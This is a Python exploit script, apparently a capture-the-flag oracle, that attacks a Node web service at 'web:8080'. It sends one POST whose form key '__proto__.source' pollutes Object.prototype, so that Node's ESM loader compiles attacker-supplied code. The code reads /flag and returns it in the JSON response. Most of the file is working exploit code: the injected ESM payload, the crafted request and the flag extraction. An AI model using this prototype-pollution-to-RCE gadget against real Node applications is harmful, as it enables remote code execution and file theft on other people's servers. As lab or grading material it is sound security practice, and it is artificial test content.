#!/usr/bin/env python3
"""node-esm oracle: prototype pollution -> Node ESM loader `source` gadget -> RCE -> read /flag.

Chain (single request):
1. POST /stage/prepare with form key `__proto__.source` -> the service's own
   nested-key settings parser walks onto Object.prototype and pollutes
   `Object.prototype.source` with our ESM source text.
2. The same handler then re-resolves its stage module via `await import()`.
   Node's internal defaultLoad destructures `{ source }` out of its (plain)
   context object, picks up the polluted value, and skips reading the real
   module because `source == null` is false. The polluted string is compiled
   as the stage module and executed in the server process.
3. The payload reads /flag and stores it on `Object.prototype.result`.
4. The handler's JSON response reflects `result` from the settings
   environment, so the flag comes back in the response body.
"""

import json
import re
import sys

import requests

BASE = "http://web:8080"

PAYLOAD = (
    "globalThis.__exfil = (await import('node:fs')).default.readFileSync(process.env.FLAG_PATH || '/flag', 'utf8');\n"
    "Object.prototype.result = globalThis.__exfil;\n"
    "export {};\n"
)


def main() -> int:
    resp = requests.post(
        f"{BASE}/stage/prepare",
        data={"__proto__.source": PAYLOAD},
        timeout=20,
    )
    print(f"[+] /stage/prepare status {resp.status_code}")
    try:
        body = resp.json()
    except ValueError:
        print(resp.text[:2000])
        return 1
    print(json.dumps(body, indent=2)[:2000])

    # stageState 'pending' means the on-disk stage module text never ran for
    # this sequence (the loader used our polluted source instead) — proof the
    # gadget fired rather than a normal import.
    if body.get("stageState") != "pending":
        print(f"[-] expected stageState 'pending' (loader skipped the real source), got {body.get('stageState')!r}")
        return 1

    result = body.get("result")
    if not isinstance(result, str) or "flag{" not in result:
        print(f"[-] no flag in reflected result: {result!r}")
        return 1

    match = re.search(r"flag\{[^}]*\}", result)
    if not match:
        print("[-] could not extract flag")
        return 1
    print(match.group(0))
    return 0


if __name__ == "__main__":
    sys.exit(main())
